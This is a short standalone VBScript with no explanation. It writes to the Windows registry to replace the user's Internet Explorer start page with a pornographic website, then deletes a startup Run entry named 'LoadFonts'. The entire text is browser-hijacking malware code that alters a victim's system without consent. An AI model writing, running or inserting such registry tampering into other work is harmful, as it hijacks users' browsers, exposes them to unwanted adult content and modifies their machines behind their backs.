Set W = Wscript.CreateObject("Wscript.Shell")
W.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page","http://www.superpornlist.com/welcome.shtml"
W.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\LoadFonts"
